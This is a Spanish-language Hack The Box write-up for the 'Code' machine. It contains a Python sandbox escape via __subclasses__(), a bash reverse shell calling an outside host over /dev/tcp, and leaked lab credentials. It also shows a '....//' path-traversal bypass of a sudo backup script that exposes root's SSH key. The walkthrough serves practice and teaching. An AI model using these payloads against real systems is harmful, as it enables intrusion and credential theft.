---
tags:
title: Code - Easy (HTB)
permalink: /Code-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash 
nmap -sCV -p22,5000 10.10.11.62
```

![Pasted image 20250805002636](images/Pasted image 20250805002636.png)


Vemos que por el puerto `5000` corre un servicio `HTTP` con un editor de texto `Python`.
![Pasted image 20250805002817](images/Pasted image 20250805002817.png)

![Pasted image 20250805021912](images/Pasted image 20250805021912.png)
#### User Flag

```python 
for i, cls in enumerate(().__class__.__base__.__subclasses__()):
    mod = getattr(cls, '__module__', '')
    if mod and 'sub' in mod:
        print(i, cls) 
```

```python 
cls = ().__class__.__base__.__subclasses__()[317]
p = cls(['whoami'], stdout=-1)
print(p.communicate()[0].decode())
```

Nos devuelve `app-production`.

Entonces nos enviamos una reverse shell a nuestra maquina 


```bash 
nc -nlvp 4444
```

```python cls = ().__class__.__base__.__subclasses__()[317]
cmd = ['bash', '-c', 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1']
p = cls(cmd, stdout=-1, stderr=-1, stdin=-1)
```

![Pasted image 20250805010547](images/Pasted image 20250805010547.png)

```bash 
cd /home/app-production ; cat user.txt
```

![Pasted image 20250805021719](images/Pasted image 20250805021719.png)

---- 

![Pasted image 20250805010850](images/Pasted image 20250805010850.png)

Vemos que en el archivo de base de datos hay credenciales 

`Martin:nafeelswordsmaster` y `development:development`

```bash 
ssh martin@10.10.11.62
Password: nafeelswordsmaster
```

![Pasted image 20250805020454](images/Pasted image 20250805020454.png)

Si vemos sobre que archivos poseemos privilegios a nivel de `Sudoers`, vemos que lo tenemos en el `/usr/bin/backy.sh`, del cual si miramos el contenido para ver que es lo que hace, vemos que busca en los directorios `/home` y `/var` archivos `.json`, los cuales despues de encotrarlos realiza un backup de dicha ruta guard치ndolo en un archivo como este: `code_home_app-production_app_2024_August.tar.bz2`.


```bash 
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Pero si nos fijamos bien en el codigo:

```bash 
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

Vemos que intenta realizar una sanitizaci칩n del c칩digo para evitar un `Path Traversal`, donde si detecta patrones como `../` los elimina, pero no lo hace de manera recursiva, de manera en la que podemos hacer algo como `....//....//` escapando de la sanitizaci칩n.

Por ende pasamos a modificar el mismo `task.json` de la ruta `home/backups`.

```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app/....//....//root/"
        ]=
}
```

Donde luego ejecutamos el script y despues descomprimimos el `.tar.bz2`

```bash 
sudo /usr/bin/backy.sh task.json
```

```bash 
tar -xjvf code_home_app-production_app_.._.._.._root_2025_August.tar.bz2
```

![Pasted image 20250805020132](images/Pasted image 20250805020132.png)

Aprovechamos el contenido de la clave `rsa` donde copiamos el contenido y desde nuestra maquina creamos la nuestra para luego autenticarnos como el usuario `root`.

```bash 
nvim id_rsa
```

![Pasted image 20250805021443](images/Pasted image 20250805021443.png)

```bash 
chmod 600 id_rsa
```

```bash 
ssh -i id_rsa root@10.10.11.62
```

```bash 
cat /root/root.txt
```

![Pasted image 20250805020345](images/Pasted image 20250805020345.png)

`~Happy Hacking.`
